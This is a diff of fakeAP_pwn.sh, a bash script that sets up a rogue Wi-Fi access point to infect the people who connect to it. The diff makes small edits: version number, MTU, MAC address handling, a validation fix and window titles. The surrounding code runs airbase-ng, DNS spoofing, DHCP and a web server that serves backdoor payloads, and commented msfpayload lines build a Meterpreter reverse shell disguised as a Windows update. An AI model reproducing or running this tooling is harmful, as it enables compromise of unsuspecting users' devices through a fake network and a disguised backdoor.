@@ -1,6 +1,6 @@
 #!/bin/bash                                                                                    #
 # (C)opyright 2010 - g0tmi1k & joker5bb                                                        #
-# fakeAP_pwn.sh (v0.3-RC28 2010-07-13)                                                         #
+# fakeAP_pwn.sh (v0.3-RC29 2010-07-13)                                                         #
 #----------------------------------------------------------------------------------------------#
 # Make sure to copy "www": cp -rf www/* /var/www/fakeAP_pwn                                    #
 # The VNC password is "g0tmi1k" (without "")                                                   #
@@ -43,11 +43,11 @@ export          payload=vnc                          # sbd/vnc/wkv/other - What 
 export     backdoorPath=/root/backdoor.exe           # ...Only used when payload is set to "other"
 export   metasploitPath=/pentest/exploits/framework3 # Metasploit directory. No trailing slash.
 export       htdocsPath=/var/www/fakeAP_pwn          # The directory location to the crafted web page. No trailing slash.
-export              mtu=1800                         # 1500/1800/xxxx - If your having timing out problems, change this.
+export              mtu=1500                         # 1500/1800/xxxx - If your having timing out problems, change this.
 export      transparent=true                         # true/false - Internet access after infected? true = yes, false = no
 export      respond2All=false                        # true/false - Respond to every WiFi probe request? true = yes, false = no
-export        fakeAPmac=random                       # random/set/false - Change the FakeAP MAC Address?
-export       macAddress=18:39:05:18:39:05            # XX:XX:XX:XX:XX:XX  - Use this MAC Address (...Only used when fakeAPmac is "set")
+export        fakeAPmac=set                          # random/set/false - Change the FakeAP MAC Address?
+export       macAddress=00:05:7c:9a:58:3f            # XX:XX:XX:XX:XX:XX  - Use this MAC Address (...Only used when fakeAPmac is "set")
 export           extras=false                        # true/false - Runs extra programs after session is created
 export            debug=false                        # true/false - If you're having problems
 export          verbose=0                            # 0/1/2      - Verbose mode. Displays exactly whats going on. 0=nothing, 1 = info, 2 = inf + commands
@@ -56,7 +56,7 @@ export          verbose=0                            # 0/1/2      - Verbose mode
 export gatewayIP=`route -n | awk '/^0.0.0.0/ {getline; print $2}'`
 export     ourIP=`ifconfig $interface | awk '/inet addr/ {split ($2,A,":"); print A[2]}'`
 export      port=`shuf -i 2000-65000 -n 1`
-export   version="0.3-RC28"
+export   version="0.3-RC29"
 trap 'cleanup' 2 # Interrupt - "Ctrl + C"
 #----------------------------------------------------------------------------------------------#
 function cleanup() {
@@ -84,6 +84,7 @@ function cleanup() {
       iptables --table nat --flush
       iptables --delete-chain
       iptables --table nat --delete-chain
+      route del -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
    fi
    echo -e "\e[01;36m[>]\e[00m Done! (= Have you... g0tmi1k?"
    exit 0
@@ -237,7 +238,7 @@ fi
 if [ "$ESSID" == "" ]; then echo -e "\e[00;31m[-]\e[00m ESSID can't be blank"; cleanup; fi
 if [ "$fakeAPchannel" == "" ]; then echo -e "\e[00;31m[-]\e[00m fakeAPchannel can't be blank"; cleanup; fi
 if [ "$payload" != "sbd" ] && [ "$payload" != "vnc" ] && [ "$payload" != "wkv" ] && [ "$payload" != "other" ]; then echo -e "\e[00;31m[-]\e[00m payload isn't correct"; cleanup; fi
-if [ "$transparent" != "true" ] && [ "$payload" != "false" ]; then echo -e "\e[00;31m[-]\e[00m transparent isn't correct"; cleanup; fi
+if [ "$transparent" != "true" ] && [ "$transparent" != "false" ]; then echo -e "\e[00;31m[-]\e[00m transparent isn't correct"; cleanup; fi
 if [ "$respond2All" != "true" ] && [ "$respond2All" != "false" ]; then echo -e "\e[00;31m[-]\e[00m respond2All isn't correct"; cleanup; fi
 if [ "$fakeAPmac" != "random" ] && [ "$fakeAPmac" != "set" ] && [ "$fakeAPmac" != "false" ]; then echo -e "\e[00;31m[-]\e[00m fakeAPmac isn't correct"; cleanup; fi
 if ! [ `echo $macAddress | egrep "^([0-9a-fA-F]{2}\:){5}[0-9a-fA-F]{2}$"` ]; then echo -e "\e[00;31m[-]\e[00m macAddress isn't correct"; cleanup; fi
@@ -325,8 +326,9 @@ if [ "$fakeAPmac" == "set" ]; then
 fi
 
 if [ "$debug" == "true" ] || [ "$verbose" != "0" ] ; then
-    macAddress=$(macchanger --show $monitorInterface | awk -F "Current MAC: " '{print $2}')
-    echo -e "\e[01;33m[i]\e[00m       macAddress=$macAddress"
+    macAddress=$(macchanger --show $monitorInterface | awk -F " " '{print $3}')
+    macAddressType=$(macchanger --show $monitorInterface | awk -F "Current MAC: " '{print $2}')
+    echo -e "\e[01;33m[i]\e[00m       macAddress=$macAddress $macAddressType"
 fi
 
 echo -e "\e[01;32m[>]\e[00m Creating scripts..."
@@ -638,14 +640,12 @@ $xterm -geometry 75x15+10+0 -T "fakeAP_pwn v$version - Metasploit (Windows)" -e 
 #if [ "$verbose" == "2" ] ; then echo "[i] Command: $metasploitPath/msfpayload windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 R | $metasploitPath/msfencode -x $htdocsPath/sbd.exe -t exe -e x86/shikata_ga_nai -c 10 -o $htdocsPath/Windows-KB183905-x64-ENU.exe"; fi
 #$xterm -geometry 75x15+10+0 -T "fakeAP_pwn v$version - Metasploit (Windows)" -e "$metasploitPath/msfpayload windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 R | $metasploitPath/msfencode -x $htdocsPath/sbd.exe -t exe -e x86/shikata_ga_nai -c 10 -o $htdocsPath/Windows-KB183905-x64-ENU.exe"
 
-echo -e "\e[01;32m[>]\e[00m Creating our fake access point..."
-if [ "$respond2All" == "true" ]; then
-   if [ "$verbose" == "2" ] ; then echo "[i] Command: airbase-ng -P -C 60 -c $fakeAPchannel -e \"$ESSID\" $monitorInterface -v"; fi
-   $xterm -geometry 75x4+10+0 -T "fakeAP_pwn v$version - Fake Access Point" -e "airbase-ng -P -C 60 -c $fakeAPchannel -e \"$ESSID\" $monitorInterface -v" &
-else
-   if [ "$verbose" == "2" ] ; then echo "[i] Command: airbase-ng -c $fakeAPchannel -e \"$ESSID\" $monitorInterface -v"; fi
-   $xterm -geometry 75x4+10+0 -T "fakeAP_pwn v$version - Fake Access Point" -e "airbase-ng -c $fakeAPchannel -e \"$ESSID\" $monitorInterface -v" &
-fi
+echo -e "\e[01;32m[>]\e[00m Creating fake access point..."
+airbaseng="airbase-ng $monitorInterface -a $macAddress -W 0 -y -c $fakeAPchannel -e \"$ESSID\""
+if [ "$respond2All" == "true" ]; then airbaseng="$airbaseng -P -C 60"; fi
+if [ "$debug" == "true" ] || [ "$verbose" == "2" ]; then airbaseng="$airbaseng -v"; fi
+if [ "$verbose" == "2" ] ; then echo "[i] Command: $airbaseng"; fi
+$xterm -geometry 75x4+10+0 -T "fakeAP_pwn v$version - Fake Access Point" -e "$airbaseng" &
 sleep 3
 
 echo -e "\e[01;32m[>]\e[00m Setting up our end..."
@@ -696,14 +696,14 @@ sleep 1 # Need to wait for metasploit, so we have an exploit ready for the targe
 if [ "$transparent" != "true" ]; then
    echo -e "\e[01;32m[>]\e[00m Starting DNS services..."
    if [ "$verbose" == "2" ] ; then echo "[i] Command: dnsspoof -i at0 -f /tmp/fakeAP_pwn.dns"; fi
-   $xterm -geometry 75x3+10+145 -T "fakeAP_pwn v$version - FakeDNS" -e "dnsspoof -i at0 -f /tmp/fakeAP_pwn.dns" &
+   $xterm -geometry 75x3+10+145 -T "fakeAP_pwn v$version - DNS services" -e "dnsspoof -i at0 -f /tmp/fakeAP_pwn.dns" &
    sleep 7
 fi
 
 echo -e "\e[01;32m[>]\e[00m Starting DHCP server..."
 if [ "$verbose" == "2" ] ;
  then echo "[i] Command: dhcpd3 -d -f -cf /tmp/fakeAP_pwn.dhcp at0"; fi
-$xterm -geometry 75x3+10+75 -T "fakeAP_pwn v$version - DHCP" -e "dhcpd3 -d -f -cf /tmp/fakeAP_pwn.dhcp at0" & # -d = logging, -f = forground
+$xterm -geometry 75x3+10+75 -T "fakeAP_pwn v$version - DHCP server" -e "dhcpd3 -d -f -cf /tmp/fakeAP_pwn.dhcp at0" & # -d = logging, -f = forground
 sleep 2
 if [ -z "$(pgrep dhcpd3)" ]; then # check if dhcpd3 server is running
    echo -e "\e[00;31m[-]\e[00m DHCP server failed to start." 1>&2
@@ -714,7 +714,7 @@ fi
 
 echo -e "\e[01;32m[>]\e[00m Starting Web server..."
 if [ "$verbose" == "2" ] ; then echo "[i] Command: /etc/init.d/apache2 start && ls /etc/apache2/sites-available/ | xargs a2dissite && a2ensite fakeAP_pwn && /etc/init.d/apache2 reload"; fi
-$xterm -geometry 75x10+100+0 -T "fakeAP_pwn v$version - WebSever" -e "/etc/init.d/apache2 start && ls /etc/apache2/sites-available/ | xargs a2dissite && a2ensite fakeAP_pwn && /etc/init.d/apache2 reload" & #dissable all sites and only enable the fakeAP_pwn one
+$xterm -geometry 75x10+100+0 -T "fakeAP_pwn v$version - Web Sever" -e "/etc/init.d/apache2 start && ls /etc/apache2/sites-available/ | xargs a2dissite && a2ensite fakeAP_pwn && /etc/init.d/apache2 reload" & #dissable all sites and only enable the fakeAP_pwn one
 sleep 2
 if [ -z "$(pgrep apache2)" ]; then
    echo -e "\e[00;31m[-]\e[00m Web server failed to start." 1>&2
